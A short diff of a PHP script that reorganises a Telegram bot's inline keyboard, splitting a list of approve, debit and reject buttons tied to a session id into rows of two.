@@ -163,6 +163,7 @@ if (!$data['ok']) {
 $messageId = $data['result']['message_id'] ?? null;
 
 // Enviar botones con TODAS las acciones disponibles
+// Enviar botones organizados en filas (ej. de 2 en 2)
 $buttons = [
     ['text' => '✅ Aprobar',   'callback_data' => "aprobar_face_{$sessionId}"],
     ['text' => '💳 Débito',    'callback_data' => "debito_face_{$sessionId}"],
@@ -174,7 +175,15 @@ $buttons = [
     ['text' => '❌ Rechazar',  'callback_data' => "rechazar_face_{$sessionId}"]
 ];
 
-$keyboard = [$buttons];
+$keyboard = [];
+$row = [];
+foreach ($buttons as $i => $btn) {
+    $row[] = $btn;
+    if (count($row) === 2 || $i === count($buttons) - 1) {
+        $keyboard[] = $row;
+        $row = [];
+    }
+}
 
 $postData = http_build_query([
     'chat_id'      => $chatId,
